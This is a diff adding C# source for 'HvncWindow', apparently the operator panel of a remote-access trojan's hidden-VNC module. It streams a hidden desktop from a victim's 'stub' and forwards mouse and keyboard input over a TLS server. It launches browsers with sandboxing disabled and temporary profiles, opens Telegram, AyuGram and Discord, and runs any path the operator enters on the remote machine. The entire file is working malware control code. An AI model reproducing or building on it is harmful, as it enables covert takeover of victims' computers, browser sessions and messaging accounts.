@@ -1,0 +1,370 @@
+using System.IO;
+using System.Windows;
+using System.Windows.Controls.Primitives;
+using System.Windows.Input;
+using System.Windows.Media.Animation;
+using System.Windows.Media.Imaging;
+using SeroServer.Net;
+using SeroServer.Protocol;
+
+namespace SeroServer.UI;
+
+public partial class HvncWindow : Window
+{
+    private readonly TlsServer _server;
+    private readonly string _clientId;
+    private volatile bool _closed, _streaming;
+    private int _frameCount;
+    private DateTime _fpsTime = DateTime.UtcNow;
+    private long _lastMoveMs;
+
+    // Canvas dimensions reported by last frame
+    private int _remoteW = 1280;
+    private int _remoteH = 720;
+
+    // App entries: (label shown in ComboBox, command line sent to stub — env vars expanded there)
+    private static readonly (string Label, string Cmd)[] AppEntries =
+    [
+        ("Explorer",  "explorer.exe"),
+        ("Chrome",    @"%ProgramFiles%\Google\Chrome\Application\chrome.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=%TEMP%\hvnc_chrome"),
+        ("Edge",      @"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=%TEMP%\hvnc_edge"),
+        ("Firefox",   @"%ProgramFiles%\Mozilla Firefox\firefox.exe -profile %TEMP%\hvnc_ff -no-remote"),
+        ("Brave",     @"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=%TEMP%\hvnc_brave"),
+        ("Opera",     @"%LOCALAPPDATA%\Programs\Opera\opera.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --no-first-run --user-data-dir=%TEMP%\hvnc_opera"),
+        ("Opera GX",  @"%LOCALAPPDATA%\Programs\Opera GX\opera.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --no-first-run --user-data-dir=%TEMP%\hvnc_operagx"),
+        ("AyuGram",   @"%APPDATA%\AyuGram Desktop\AyuGram.exe"),
+        ("Telegram",  @"%APPDATA%\Telegram Desktop\Telegram.exe"),
+        ("Discord",   @"%LOCALAPPDATA%\Discord\Update.exe --processStart Discord.exe"),
+    ];
+
+    public HvncWindow(TlsServer server, string clientId)
+    {
+        _server   = server;
+        _clientId = clientId;
+        InitializeComponent();
+
+        TxtClientId.Text = $"[ {clientId} ]";
+
+        SldQuality.ValueChanged += (_, e) => TxtQuality.Text = $"{(int)e.NewValue}";
+        SldFps.ValueChanged     += (_, e) => TxtFpsVal.Text  = $"{(int)e.NewValue}";
+
+        _server.HvncFrameReceived  += OnHvncFrame;
+        _server.ClientDisconnected += OnClientDisconnected;
+        Closed += (_, _) =>
+        {
+            _closed = true;
+            _server.HvncFrameReceived  -= OnHvncFrame;
+            _server.ClientDisconnected -= OnClientDisconnected;
+            if (_streaming) SendStop();
+        };
+
+
+        foreach (var (label, _) in AppEntries)
+            CmbApp.Items.Add(label);
+        CmbApp.SelectedIndex = 0;
+
+        Opacity = 0;
+        Loaded += (_, _) => BeginAnimation(OpacityProperty,
+            new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(180)));
+    }
+
+    // ── Fullscreen ────────────────────────────────────────────────────────────
+
+    private void BtnFullscreen_Click(object s, RoutedEventArgs e)
+    {
+        if (WindowState == WindowState.Maximized)
+        {
+            WindowState = WindowState.Normal;
+            RootBorder.CornerRadius = new CornerRadius(10);
+            BtnFullscreen.Content = "⛶";
+        }
+        else
+        {
+            WindowState = WindowState.Maximized;
+            RootBorder.CornerRadius = new CornerRadius(0);
+            BtnFullscreen.Content = "❐";
+        }
+    }
+
+    // ── Streaming state ───────────────────────────────────────────────────────
+
+    private void SetStreamingState(bool streaming)
+    {
+        _streaming = streaming;
+        Dispatcher.BeginInvoke(() =>
+        {
+            BtnStart.IsEnabled   = !streaming;
+            BtnStart.Opacity     = streaming ? 0.35 : 1.0;
+            BtnStop.IsEnabled    = streaming;
+            BtnStop.Opacity      = streaming ? 1.0 : 0.35;
+            SldQuality.IsEnabled = !streaming;
+            SldFps.IsEnabled     = !streaming;
+            TxtStatus.Text       = streaming ? "Streaming..." : "Stopped";
+            LiveBadge.Visibility = streaming ? Visibility.Visible : Visibility.Collapsed;
+            TxtPlaceholder.Visibility = streaming ? Visibility.Collapsed : Visibility.Visible;
+            if (!streaming) TxtFps.Text = "";
+        });
+    }
+
+    // ── Outgoing ──────────────────────────────────────────────────────────────
+
+    private void SendStart()
+    {
+        var data = new HvncStartData
+        {
+            Quality = (int)SldQuality.Value,
+            Fps     = (int)SldFps.Value,
+            Width   = 1280,
+            Height  = 720
+        };
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.HvncStart,
+            Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
+        });
+        SetStreamingState(true);
+    }
+
+    private void SendStop()
+    {
+        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.HvncStop, Data = "{}" });
+        SetStreamingState(false);
+    }
+
+    private void SendAck()
+    {
+        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.HvncFrameAck });
+    }
+
+    private void SendInput(HvncInputData inp)
+    {
+        if (!_streaming) return;
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.HvncInput,
+            Data = Newtonsoft.Json.JsonConvert.SerializeObject(inp)
+        });
+    }
+
+    private void SendExec(string path)
+    {
+        _ = _server.SendToClient(_clientId, new Packet
+        {
+            Type = PacketType.HvncExec,
+            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncExecData { Path = path })
+        });
+    }
+
+    // ── Incoming ──────────────────────────────────────────────────────────────
+
+    private void OnHvncFrame(string clientId, string json)
+    {
+        if (_closed || clientId != _clientId) return;
+        try
+        {
+            var frame = Newtonsoft.Json.JsonConvert.DeserializeObject<HvncFrameData>(json);
+            if (frame == null || string.IsNullOrEmpty(frame.J)) { SendAck(); return; }
+
+            _remoteW = frame.W > 0 ? frame.W : _remoteW;
+            _remoteH = frame.H > 0 ? frame.H : _remoteH;
+
+            Task.Run(() =>
+            {
+                try
+                {
+                    var bytes = Convert.FromBase64String(frame.J);
+                    using var ms = new MemoryStream(bytes);
+                    var bi = new BitmapImage();
+                    bi.BeginInit();
+                    bi.StreamSource = ms;
+                    bi.CacheOption = BitmapCacheOption.OnLoad;
+                    bi.EndInit();
+                    bi.Freeze();
+                    if (!_closed)
+                        Dispatcher.BeginInvoke(() => ShowFrame(bi));
+                }
+                catch { SendAck(); }
+            });
+        }
+        catch { SendAck(); }
+    }
+
+    private void ShowFrame(BitmapImage bi)
+    {
+        if (_closed) return;
+        ImgFrame.Source = bi;
+        TxtPlaceholder.Visibility = Visibility.Collapsed;
+
+        _frameCount++;
+        var now = DateTime.UtcNow;
+        if ((now - _fpsTime).TotalSeconds >= 1)
+        {
+            TxtFps.Text        = $"{_frameCount} fps";
+            TxtResolution.Text = $"{_remoteW}×{_remoteH}";
+            _frameCount = 0;
+            _fpsTime = now;
+        }
+        SendAck();
+    }
+
+    // ── Input mapping ─────────────────────────────────────────────────────────
+
+    private (int rx, int ry) ToRemote(Point local)
+    {
+        double sx = _remoteW / Math.Max(1, ImgFrame.ActualWidth);
+        double sy = _remoteH / Math.Max(1, ImgFrame.ActualHeight);
+        return ((int)(local.X * sx), (int)(local.Y * sy));
+    }
+
+    private void ImgFrame_MouseMove(object s, MouseEventArgs e)
+    {
+        if (ChkMouse.IsChecked != true) return;
+        long now = Environment.TickCount64;
+        if (now - _lastMoveMs < 8) return; // cap at ~125 Hz to avoid flooding stub input queue
+        _lastMoveMs = now;
+        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
+        SendInput(new HvncInputData { T = "mm", X = rx, Y = ry });
+    }
+
+    private void ImgFrame_MouseDown(object s, MouseButtonEventArgs e)
+    {
+        ImgFrame.Focus();
+        ImgFrame.CaptureMouse();
+        if (ChkMouse.IsChecked != true) return;
+        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
+        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
+        SendInput(new HvncInputData { T = "mc", X = rx, Y = ry, Button = btn, Down = true });
+        e.Handled = true;
+    }
+
+    private void ImgFrame_MouseUp(object s, MouseButtonEventArgs e)
+    {
+        ImgFrame.ReleaseMouseCapture();
+        if (ChkMouse.IsChecked != true) return;
+        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
+        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
+        SendInput(new HvncInputData { T = "mc", X = rx, Y = ry, Button = btn, Down = false });
+        e.Handled = true;
+    }
+
+    private void ImgFrame_MouseWheel(object s, MouseWheelEventArgs e)
+    {
+        if (ChkMouse.IsChecked != true) return;
+        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
+        SendInput(new HvncInputData { T = "mw", X = rx, Y = ry, WheelDelta = e.Delta });
+    }
+
+    private void ImgFrame_KeyDown(object s, KeyEventArgs e)
+    {
+        if (ChkKeyboard.IsChecked != true) return;
+        int vk = KeyInterop.VirtualKeyFromKey(e.Key);
+        SendInput(new HvncInputData { T = "kd", VK = vk });
+        e.Handled = true;
+    }
+
+    private void ImgFrame_KeyUp(object s, KeyEventArgs e)
+    {
+        if (ChkKeyboard.IsChecked != true) return;
+        int vk = KeyInterop.VirtualKeyFromKey(e.Key);
+        SendInput(new HvncInputData { T = "ku", VK = vk });
+        e.Handled = true;
+    }
+
+    // ── UI handlers ───────────────────────────────────────────────────────────
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(Close);
+    }
+
+    private void BtnStart_Click(object s, RoutedEventArgs e) => SendStart();
+    private void BtnStop_Click(object s, RoutedEventArgs e)  => SendStop();
+    private void Close_Click(object s, RoutedEventArgs e)    => Close();
+
+    private void TitleBar_Drag(object s, MouseButtonEventArgs e)
+    {
+        if (WindowState == WindowState.Normal) DragMove();
+    }
+
+    // ── App launcher ──────────────────────────────────────────────────────────
+
+    private void BtnLaunch_Click(object s, RoutedEventArgs e)
+    {
+        int idx = CmbApp.SelectedIndex;
+        if (idx < 0 || idx >= AppEntries.Length) return;
+        SendExec(AppEntries[idx].Cmd);
+    }
+
+    private void BtnCustomPath_Click(object s, RoutedEventArgs e)
+    {
+        var win = new Window
+        {
+            Title = "Custom path",
+            Width = 500, Height = 148,
+            WindowStyle = WindowStyle.ToolWindow,
+            ResizeMode = ResizeMode.NoResize,
+            WindowStartupLocation = WindowStartupLocation.CenterOwner,
+            Owner = this,
+            Background = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0x07, 0x09, 0x0F))
+        };
+
+        var stack = new System.Windows.Controls.StackPanel { Margin = new Thickness(10) };
+
+        var hint = new System.Windows.Controls.TextBlock
+        {
+            Text = "Path on the client machine (env vars expanded, e.g. %APPDATA%\\app.exe)",
+            Foreground = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0x50, 0x58, 0x80)),
+            FontSize = 10, Margin = new Thickness(0, 0, 0, 4)
+        };
+
+        var tb = new System.Windows.Controls.TextBox
+        {
+            Background = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0x0E, 0x16, 0x30)),
+            Foreground = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0xB0, 0xC8, 0xFF)),
+            BorderBrush = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0x1E, 0x2A, 0x50)),
+            CaretBrush = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0xB0, 0xC8, 0xFF)),
+            FontSize = 11, Height = 26, Margin = new Thickness(0, 0, 0, 8)
+        };
+        tb.KeyDown += (_, ke) =>
+        {
+            if (ke.Key == System.Windows.Input.Key.Return) { win.DialogResult = true; win.Close(); }
+            if (ke.Key == System.Windows.Input.Key.Escape) { win.Close(); }
+        };
+
+        var btn = new System.Windows.Controls.Button
+        {
+            Content = "LAUNCH", Height = 26,
+            Background = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0x0A, 0x20, 0x10)),
+            Foreground = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E)),
+            BorderBrush = new System.Windows.Media.SolidColorBrush(
+                System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E))
+        };
+        btn.Click += (_, _) => { win.DialogResult = true; win.Close(); };
+
+        stack.Children.Add(hint);
+        stack.Children.Add(tb);
+        stack.Children.Add(btn);
+        win.Content = stack;
+        win.Loaded += (_, _) => tb.Focus();
+
+        if (win.ShowDialog() == true && !string.IsNullOrWhiteSpace(tb.Text))
+            SendExec(tb.Text.Trim());
+    }
+
+    // ── Resize grip ───────────────────────────────────────────────────────────
+
+    private void ResizeGrip_DragDelta(object s, DragDeltaEventArgs e)
+    {
+        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
+        Height = Math.Max(MinHeight, Height + e.VerticalChange);
+    }
+}
